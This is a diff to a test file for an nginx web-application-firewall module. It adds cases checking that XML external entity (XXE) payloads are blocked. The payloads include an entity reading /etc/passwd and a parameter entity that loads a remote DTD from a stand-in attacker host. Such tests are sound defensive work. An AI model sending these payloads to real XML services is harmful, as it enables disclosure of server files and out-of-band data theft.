@@ -159,12 +159,26 @@ Content-Type: application/vnd.api+json; charset=utf-8
 --- error_code: 403
 
 === TEST 15: SOAP structured XML media type is scanned
+# Real XXE: the external SYSTEM file: reference is the gadget (the "system
+# \"file:" signature), not the bare "<!ENTITY". Still blocks after "<!ENTITY"
+# was dropped as a standalone signature (t/05 TEST 74).
 --- config
     location /t { shield block; empty_gif; }
 --- request eval
 "POST /t\n<!ENTITY x SYSTEM \"file:///etc/passwd\">"
 --- more_headers
 Content-Type: application/soap+xml; charset=utf-8
+--- error_code: 403
+
+=== TEST 15b: parameter-entity XXE via an external http DTD still blocks
+# The out-of-band XXE form: a parameter entity whose SYSTEM reference is a remote
+# DTD. Caught by "system \"http:", independent of the "<!ENTITY" token.
+--- config
+    location /t { shield block; empty_gif; }
+--- request eval
+"POST /t\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % x SYSTEM \"http://evil/e.dtd\">%x;]><foo/>"
+--- more_headers
+Content-Type: application/xml
 --- error_code: 403
 
 === TEST 16: GraphQL media type is scanned
